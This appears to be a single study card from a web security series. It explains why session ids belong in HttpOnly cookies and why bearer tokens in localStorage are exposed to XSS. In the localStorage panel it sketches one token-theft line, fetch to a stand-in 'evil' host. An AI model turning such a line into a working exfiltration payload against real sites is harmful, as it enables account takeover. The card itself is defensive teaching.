BackendHttpOnly · document.cookie

JS cannot keep a secret.

Anything in the JS heap, localStorage, or a non-HttpOnly cookie is readable by any script on the origin (XSS, extension, DevTools). Set-Cookie: HttpOnly; Secure; SameSite=Lax keeps the id out of document.cookie; the browser still attaches Cookie on same-site requests (plate 232).

Server session · opaque id

HttpOnly

Set-Cookie: sid=a8f3…; HttpOnly; Secure; SameSite=Lax; Max-Age=86400 document.cookie // no sid DELETE FROM sessions WHERE sid=$1 → revoke all tabs now
XSS cannot export sid from JS (plate 234).
401 if Cookie missing/invalid. Logout = delete the row.
vs

Bearer in the page

localStorage

localStorage.token = "eyJ…" Authorization: Bearer eyJ… XSS: fetch(evil + token) logout here ≠ revoke elsewhere denylist = a session store
Any script can read it. JWT is a format; storage is the bug.
VITE_ / NEXT_PUBLIC_ keys ship in the bundle too.
What

An HttpOnly cookie is not in the JS address space. A token in localStorage is. CSRF is a separate control (plates 30, 233).

Why

XSS is common. Stealing the bearer is account takeover. Interviews: 401 vs stored credential, and why a JWT blocklist is a session table.

Trap

Blaming JWT. Putting the access token in localStorage “because SPA.” Access-Control-Allow-Credentials with * is invalid. A JWT in an HttpOnly cookie is a session with extra parsing.
